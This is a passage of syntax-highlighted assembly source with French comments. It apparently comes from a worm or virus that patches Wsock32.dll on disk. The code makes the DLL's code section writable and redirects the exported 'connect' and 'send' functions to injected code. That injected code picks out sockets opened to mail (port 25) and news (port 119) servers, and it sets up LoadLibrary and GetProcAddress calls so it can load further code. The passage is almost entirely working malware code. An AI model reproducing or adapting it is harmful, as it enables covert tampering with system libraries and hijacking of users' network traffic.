</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trouve_data</span><span class="sc0">
</span><span class="sc5">continue_apres_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">         </span><span class="sc1">;taille d'un section header </span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ttes_les_sections</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tout_trouve</span><span class="sc0">

</span><span class="sc1">;------- recupere des donnees dans le header de la section "exported data"</span><span class="sc0">

</span><span class="sc5">trouve_edata</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">diff</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue_apres_edata</span><span class="sc0">

</span><span class="sc1">;------- recupere des donnees dans le header de la section "code"</span><span class="sc0">

</span><span class="sc5">trouve_text</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">60000020h</span><span class="sc0">    </span><span class="sc1">;test si c'est du code</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">      </span><span class="sc1">;rendre la section code capable d'être automodifiée</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">startofcodeheader</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">patch_size</span><span class="sc0">     </span><span class="sc1">;test si suffisamment de place ds section code</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">stop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">cdiff</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">rvaendofcode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue_apres_text</span><span class="sc0">

</span><span class="sc1">;------- recupere des donnees dans le header de la section "imported data"</span><span class="sc0">

</span><span class="sc5">trouve_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">idiff</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue_apres_data</span><span class="sc0">

</span><span class="sc1">;---------- se préparer à scanner la table des fonctions exportées</span><span class="sc0">

</span><span class="sc5">tout_trouve</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">addoffunctions</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">diff</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc0">         </span><span class="sc1">; get export table RVA</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;addoffunctions</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;addofnames</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;addofordinals</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; get number of name ptrs</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                               </span><span class="sc1">; edx is our ordinal counter</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">addofnames</span><span class="sc0">

</span><span class="sc1">;trouve le point d'entrée des fc exportées (connect, send) dans l'image mappée de Wsock32.dll</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">verif</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;pour vérifier qu'on a bien trouvé les 2 fonctions</span><span class="sc0">
</span><span class="sc5">cherche_API</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">diff</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"nnoc"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trouve_API_1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"dnes"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trouve_API_2</span><span class="sc0">
</span><span class="sc5">fausse_alerte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cherche_API</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">verif</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;on en cherche 2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stop</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suite</span><span class="sc0">

</span><span class="sc1">;-------- on a trouvé "connect"</span><span class="sc0">

</span><span class="sc5">trouve_API_1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">"tce"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">addofordinals</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">addoffunctions</span><span class="sc0"> 
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;dans eax: RVA de connect</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">rvaoriginale_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaendofcode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cdiff</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">redirect_to_my_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startpatch</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;changer le point d'entree de la fonction</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">verif</span><span class="sc0">               </span><span class="sc1">;une fc trouvée de plus</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fausse_alerte</span><span class="sc0">

</span><span class="sc1">;-------- on a trouvé send</span><span class="sc0">

</span><span class="sc5">trouve_API_2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">addofordinals</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">addoffunctions</span><span class="sc0"> 
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;dans eax: RVA de send</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">rvaoriginale_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaendofcode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cdiff</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">redirect_to_my_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startpatch</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;changer le point d'entree de la fonction</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">verif</span><span class="sc0">               </span><span class="sc1">;une fc trouvée de plus</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fausse_alerte</span><span class="sc0">

</span><span class="sc5">suite</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">startofcodeheader</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">patch_size</span><span class="sc0">   </span><span class="sc1">;changer dans le header la taille du code total</span><span class="sc0">

</span><span class="sc1">;------- cherche l'offset-handle du kernel32</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krnl32name</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">krnl32ofs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- cherche l'adresse de l'API LoadLibrary qu'on appelera dans le patch </span><span class="sc0">
</span><span class="sc1">;(mieux vaut aller direct dans le Kernel)</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">llname</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">krnl32ofs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">llofs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- cherche l'adresse de l'API FreeLibrary qu'on appelera dans le patch</span><span class="sc0">
</span><span class="sc1">;(mieux vaut aller direct dans le Kernel)</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">flname</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">krnl32ofs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flofs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- cherche l'adresse de l'API GetProcAddress qu'on appelera dans le patch </span><span class="sc0">
</span><span class="sc1">;(mieux vaut aller direct dans le Kernel)</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gpaname</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">krnl32ofs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">gpaofs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- installer le patch</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaendofcode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc0">
    
    </span><span class="sc1">;********************** CODE INSERE DANS WSOCK32.DLL **********************</span><span class="sc0">

    </span><span class="sc5">startpatch</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;===============&gt; point d'entrée de la nouvelle connect &lt;======================</span><span class="sc0">

    </span><span class="sc5">redirect_to_my_connect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc1">;----- chope delta offset</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta1</span><span class="sc0">
    </span><span class="sc5">delta1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">no_socket_mail</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta1</span><span class="sc0">

    </span><span class="sc1">;----- vérifier si c'est une session mail ou news</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;32=pushad/4=pushfd/4=call/4=no de socket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;le port dans al</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">          </span><span class="sc1">;connection mail?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">teste_119</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;no de socket</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;stocke le no de socket connectée au port 25 </span><span class="sc0">
                    </span><span class="sc1">;(dans no_socket_mail)</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;edi pointe maintenant sur handle_madll</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">la_suite</span><span class="sc0">
    </span><span class="sc5">teste_119</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">119</span><span class="sc0">         </span><span class="sc1">;connection news?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">retour_a_connect</span><span class="sc0">        </span><span class="sc1">;non=&gt;on revient au send original</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;edi pointe maintenant vers no_socket_news</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;no de socket</span><span class="sc0">
